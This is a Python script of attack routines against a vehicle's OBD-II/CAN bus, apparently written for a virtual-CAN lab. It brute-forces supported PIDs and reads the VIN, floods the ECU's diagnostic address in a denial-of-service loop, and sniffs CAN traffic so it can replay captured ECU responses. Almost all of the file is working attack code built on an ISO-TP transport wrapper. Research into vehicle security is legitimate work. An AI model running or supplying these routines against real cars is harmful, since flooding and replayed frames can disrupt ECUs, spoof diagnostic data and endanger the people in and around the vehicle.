import time
import config
import utils
from transport import tm

# Wrappers to match original logic style
def ISOTP_SEND(data, txid, rxid):
    tm.send(data, txid, rxid)

def ISOTP_RECEIVE(txid, rxid, timeout=0.0):
    return tm.receive(txid, rxid, timeout)

def pretty_hex(b: bytes) -> str:
    return " ".join(f"{x:02X}" for x in b)

# ----------------- ATTACK: PID ENUMERATION -----------------
def scan_mode_pids(mode: int, pid_start: int = 0x00, pid_end: int = 0xFF, timeout: float = 0.5):
    """
    Brute-force all PIDs for a single OBD mode.
    """
    supported = {}
    print(f"\n=== Scanning Mode 0x{mode:02X} ===")

    for pid in range(pid_start, pid_end + 1):
        req = bytes([mode, pid])
        ISOTP_SEND(req, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)
        time.sleep(0.1) # Original delay
        resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=timeout)

        # No response → treat as not supported
        if resp is None or len(resp) == 0:
            continue

        # -------- Mode 01: 41 <pid> <data...> --------
        if mode == 0x01:
            if len(resp) < 2: continue
            if resp[0] != 0x41: continue
            if resp[1] != pid: continue
            data = resp[2:]

        # -------- Mode 09: PID 02 is raw VIN --------
        elif mode == 0x09:
            if pid == 0x02 and resp[0] not in (0x12, 0x7F):
                data = resp[:] # VIN bytes only
            else:
                continue

        # -------- Generic OBD mode handling --------
        else:
            if len(resp) < 2: continue
            if resp[0] != (mode + 0x40): continue
            if resp[1] != pid: continue
            data = resp[2:]

        supported[pid] = data
        print(f"[+] Mode 0x{mode:02X} PID 0x{pid:02X} | Resp: {pretty_hex(resp)}")

    print(f"[*] Mode 0x{mode:02X} → {len(supported)} supported PIDs\n")
    return supported

def PID_ENUMERATIONS():
    tm.clear_queues() # Fix buffering
    print("[*] Starting PID Enumeration for all OBD modes..\n")

    # Only include modes your ECU actually handles today.
    MODES_TO_SCAN = [0x01, 0x09]
    all_supported = {}

    for mode in MODES_TO_SCAN:
        mode_supported = scan_mode_pids(mode)
        all_supported[mode] = mode_supported

    # Summary
    print("\n========== GLOBAL SUMMARY ==========")
    total = 0
    for mode, pids in all_supported.items():
        print(f"\nMode 0x{mode:02X}: {len(pids)} PIDs")
        for pid, data in pids.items():
            data_str = pretty_hex(data) if data else "(no data)"
            print(f"  PID 0x{pid:02X} → {data_str}")
        total += len(pids)

    print("\n====================================")
    print(f"[*] Total Supported PID/Mode pairs found: {total}")
    print("====================================\n")

# ----------------- ATTACK: OBD DOS -----------------
def OBD_DOS(duration_seconds):
    tm.clear_queues() # Fix buffering
    req = bytes([0x00, 0x02])

    start_time = time.time()
    frame_count = 0

    while time.time() - start_time < duration_seconds:
        try:
            print(f"[ATTACK] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(req)}")
            ISOTP_SEND(req, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)
            frame_count += 1
        except Exception:
            continue

    print(f"[DoS] Sent {frame_count} frames with ID {config.ID_ECU_PHYSICAL:03X}")

# ----------------- ATTACK: SNIFF AND REPLAY -----------------
def OBD_SNIFF_AND_REPLAY(duration_seconds: int = 10, replay_delay: float = 0.01):
    tm.clear_queues() # Fix buffering
    print(f"\n[REPLAY] Sniffing for {duration_seconds} seconds on vcan0 ...")

    captured = []  # list of tuples: (can_id, dlc, data_bytes)
    end_time = time.time() + duration_seconds

    while time.time() < end_time:
        msg = tm.bus.recv(timeout=0.2)
        if msg is None:
            continue

        data_bytes = bytes(msg.data)
        line = f"{msg.arbitration_id:03X}|{msg.dlc}|{pretty_hex(data_bytes)}"
        print(f"[SNIFF] {line}")

        captured.append((msg.arbitration_id, msg.dlc, data_bytes))

    print(f"[REPLAY] Sniffing done. Captured {len(captured)} frames.")

    if not captured:
        print("[REPLAY] Nothing to replay.")
        return

    print("[REPLAY] Replaying captured ECU responses only ...")

    count = 0
    for can_id, dlc, data_bytes in captured:
        # Skip tester frames (7E0)
        if can_id == config.ID_ECU_PHYSICAL:
            continue

        # only replay ECU frames (e.g. 7E8)
        payload = data_bytes[:dlc]

        import can
        msg = can.Message(
            arbitration_id=can_id,
            data=payload,
            is_extended_id=False
        )

        try:
            tm.bus.send(msg)
            count += 1
            print(f"[REPLAY] → ID={can_id:03X} DLC={dlc} DATA={pretty_hex(payload)}")
        except Exception:
            continue

        time.sleep(replay_delay)

    print(f"[REPLAY] Finished. Replayed {count} frames.")
